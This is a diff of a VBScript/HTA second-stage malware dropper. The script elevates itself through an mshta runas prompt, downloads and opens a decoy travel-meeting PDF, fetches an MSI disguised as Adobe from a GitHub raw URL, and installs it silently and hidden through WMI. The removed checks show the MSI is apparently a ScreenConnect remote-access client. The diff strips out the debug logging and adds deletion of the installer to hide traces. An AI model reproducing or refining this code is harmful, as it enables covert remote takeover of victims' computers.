@@ -1,26 +1,16 @@
-Dim fso, sh, qs, tmp, selfPath, isAdmin, log, f
-Dim http, stream, msiUrl, msiPath, pid
-Dim wmiSvc, procClass, startup, cmdLine
-Dim pdfUrl, pdfPath, ph, ps
+' ============================================================
+'  Stage 2 — no Dim, auto-declared on first use
+' ============================================================
 
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set sh  = CreateObject("WScript.Shell")
 qs  = Chr(34)
 tmp = sh.ExpandEnvironmentStrings("%TEMP%")
-log = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\Desktop\stage2_debug.txt"
-
-Set f = fso.CreateTextFile(log, True)
-f.WriteLine "=== stage2 start ==="
-f.WriteLine "time     : " & Now
-f.WriteLine "user     : " & sh.ExpandEnvironmentStrings("%USERNAME%")
-f.WriteLine "computer : " & sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
-f.WriteLine "tmp      : " & tmp
 
 selfPath = location.href
 selfPath = Replace(selfPath, "file:///", "")
 selfPath = Replace(selfPath, "%20", " ")
 selfPath = Replace(selfPath, "/", "\")
-f.WriteLine "selfPath : " & selfPath
 
 isAdmin = True
 On Error Resume Next
@@ -29,209 +19,75 @@ If Err.Number <> 0 Then isAdmin = False
 Err.Clear
 On Error GoTo 0
 If isAdmin Then sh.RegDelete "HKLM\SOFTWARE\Microsoft\_a"
-f.WriteLine "isAdmin  : " & isAdmin
 
 If Not isAdmin Then
-    f.WriteLine "-> elevate via mshta runas"
-    f.Close
     CreateObject("Shell.Application").ShellExecute "mshta.exe", qs & selfPath & qs, "", "runas", 1
     self.close
 End If
 
-f.WriteLine "-> elevated, running payload"
-f.WriteLine ""
-
 ' ============================================================
-'  PDF
+'  PDF first — WinHTTP
 ' ============================================================
-f.WriteLine "--- PDF ---"
 pdfUrl  = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Travel-Meeting-Plan-Q4-2026.pdf"
 pdfPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Travel-Meeting-Plan-Q4-2026.pdf"
-f.WriteLine "pdf url  : " & pdfUrl
-f.WriteLine "pdf dest : " & pdfPath
 
-Dim pdfErr
-pdfErr = ""
 On Error Resume Next
 Set ph = CreateObject("WinHttp.WinHttpRequest.5.1")
-If Err.Number <> 0 Then
-    pdfErr = "create: " & Err.Number & " - " & Err.Description
-    Err.Clear
-End If
-If pdfErr = "" Then
-    ph.Open "GET", pdfUrl, False
-    If Err.Number <> 0 Then
-        pdfErr = "open: " & Err.Number & " - " & Err.Description
-        Err.Clear
-    End If
-End If
-If pdfErr = "" Then
-    ph.Send
-    If Err.Number <> 0 Then
-        pdfErr = "send: " & Err.Number & " - " & Err.Description
-        Err.Clear
-    End If
-End If
+ph.Open "GET", pdfUrl, False
+ph.Send
 On Error GoTo 0
 
-If pdfErr <> "" Then
-    f.WriteLine "pdf http : ERR " & pdfErr
-Else
-    f.WriteLine "pdf stat : " & ph.Status
-    f.WriteLine "pdf body : " & LenB(ph.ResponseBody) & " bytes"
-End If
-
-If pdfErr = "" And ph.Status = 200 Then
-    Dim pdfSaveErr
-    pdfSaveErr = ""
+If ph.Status = 200 Then
     On Error Resume Next
     Set ps = CreateObject("ADODB.Stream")
     ps.Type = 1
     ps.Open
     ps.Write ph.ResponseBody
     ps.SaveToFile pdfPath, 2
-    If Err.Number <> 0 Then
-        pdfSaveErr = Err.Number & " - " & Err.Description
-        Err.Clear
-    End If
     ps.Close
     On Error GoTo 0
-    f.WriteLine "pdf save : " & pdfSaveErr
     If fso.FileExists(pdfPath) Then
-        f.WriteLine "pdf disk : " & fso.GetFile(pdfPath).Size & " bytes"
-        On Error Resume Next
         CreateObject("Shell.Application").ShellExecute pdfPath, "", "", "open", 1
-        On Error GoTo 0
-        f.WriteLine "pdf open : shell execute called"
-    Else
-        f.WriteLine "pdf disk : FALSE"
     End If
 End If
-f.WriteLine ""
 
 ' ============================================================
-'  MSI
+'  MSI second — WinHTTP
 ' ============================================================
-f.WriteLine "--- MSI ---"
 msiUrl  = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Adobe.msi"
 msiPath = tmp & "\a.msi"
-f.WriteLine "msi url  : " & msiUrl
-f.WriteLine "msi dest : " & msiPath
 
-Dim msiErr
-msiErr = ""
 On Error Resume Next
-Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
-If Err.Number <> 0 Then
-    msiErr = "create: " & Err.Number & " - " & Err.Description
-    Err.Clear
-End If
-If msiErr = "" Then
-    http.Open "GET", msiUrl, False
-    If Err.Number <> 0 Then
-        msiErr = "open: " & Err.Number & " - " & Err.Description
-        Err.Clear
-    End If
-End If
-If msiErr = "" Then
-    http.Send
-    If Err.Number <> 0 Then
-        msiErr = "send: " & Err.Number & " - " & Err.Description
-        Err.Clear
-    End If
-End If
+Set http2 = CreateObject("WinHttp.WinHttpRequest.5.1")
+http2.Open "GET", msiUrl, False
+http2.Send
 On Error GoTo 0
 
-If msiErr <> "" Then
-    f.WriteLine "msi http : ERR " & msiErr
-Else
-    f.WriteLine "msi stat : " & http.Status
-    f.WriteLine "msi body : " & LenB(http.ResponseBody) & " bytes"
-End If
-
-If msiErr = "" And http.Status = 200 Then
-    Dim msiSaveErr
-    msiSaveErr = ""
+If http2.Status = 200 Then
     On Error Resume Next
     Set stream = CreateObject("ADODB.Stream")
     stream.Type = 1
     stream.Open
-    stream.Write http.ResponseBody
+    stream.Write http2.ResponseBody
     stream.SaveToFile msiPath, 2
-    If Err.Number <> 0 Then
-        msiSaveErr = Err.Number & " - " & Err.Description
-        Err.Clear
-    End If
     stream.Close
     On Error GoTo 0
-    f.WriteLine "msi save : " & msiSaveErr
-    If fso.FileExists(msiPath) Then
-        f.WriteLine "msi disk : " & fso.GetFile(msiPath).Size & " bytes"
-    Else
-        f.WriteLine "msi disk : FALSE"
-    End If
 End If
 
-' ---------- WMI spawn ----------
 If fso.FileExists(msiPath) Then
-    f.WriteLine "-> WMI spawn msiexec"
-    Dim wmiErr
-    wmiErr = ""
-    On Error Resume Next
-    Set wmiSvc = GetObject("winmgmts:\\.\root\cimv2")
-    If Err.Number <> 0 Then
-        wmiErr = "GetObject: " & Err.Number & " - " & Err.Description
-        Err.Clear
-    End If
-    If wmiErr = "" Then
-        Set procClass = wmiSvc.Get("Win32_Process")
-        Set startup   = wmiSvc.Get("Win32_ProcessStartup").SpawnInstance_
-        startup.ShowWindow = 0
-        cmdLine = "msiexec.exe /i " & qs & msiPath & qs & " /qn+ /norestart ALLUSERS=1"
-        f.WriteLine "msi cmd  : " & cmdLine
-        procClass.Create cmdLine, Null, startup, pid
-        If Err.Number <> 0 Then
-            wmiErr = "Create: " & Err.Number & " - " & Err.Description
-            Err.Clear
-        Else
-            f.WriteLine "msi spawn: pid " & pid
-        End If
-    End If
-    On Error GoTo 0
-    If wmiErr <> "" Then f.WriteLine "wmi err  : " & wmiErr
-Else
-    f.WriteLine "-> skipped install (msi not on disk)"
+    Set wmiSvc    = GetObject("winmgmts:\\.\root\cimv2")
+    Set procClass = wmiSvc.Get("Win32_Process")
+    Set startup   = wmiSvc.Get("Win32_ProcessStartup").SpawnInstance_
+    startup.ShowWindow = 0
+    cmdLine = "msiexec.exe /i " & qs & msiPath & qs & " /qn+ /norestart ALLUSERS=1"
+    procClass.Create cmdLine, Null, startup, pid
 End If
 
-f.WriteLine "-> waiting 30s"
 sh.Run "%COMSPEC% /c timeout /t 30 /nobreak >nul", 0, True
+sh.Run "%COMSPEC% /c timeout /t 60 /nobreak >nul", 0, True
 
-' ---------- post-install check ----------
-Dim c1, c2
-c1 = fso.FolderExists("C:\Program Files (x86)\ScreenConnect Client")
-c2 = fso.FolderExists("C:\Program Files\ScreenConnect Client")
-f.WriteLine "check x86: " & c1
-f.WriteLine "check x64: " & c2
-
-Dim procs, cnt
-cnt = 0
 On Error Resume Next
-Set procs = wmiSvc.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name='msiexec.exe'")
-For Each p In procs
-    cnt = cnt + 1
-Next
+If fso.FileExists(msiPath) Then fso.DeleteFile msiPath, True
 On Error GoTo 0
-f.WriteLine "msiexec now: " & cnt
-
-Dim mlog
-mlog = tmp & "\msi_install.log"
-If fso.FileExists(mlog) Then
-    f.WriteLine "msi log  : " & fso.GetFile(mlog).Size & " bytes"
-Else
-    f.WriteLine "msi log  : NOT FOUND"
-End If
-
-f.WriteLine "=== end ==="
-f.Close
 
 self.close
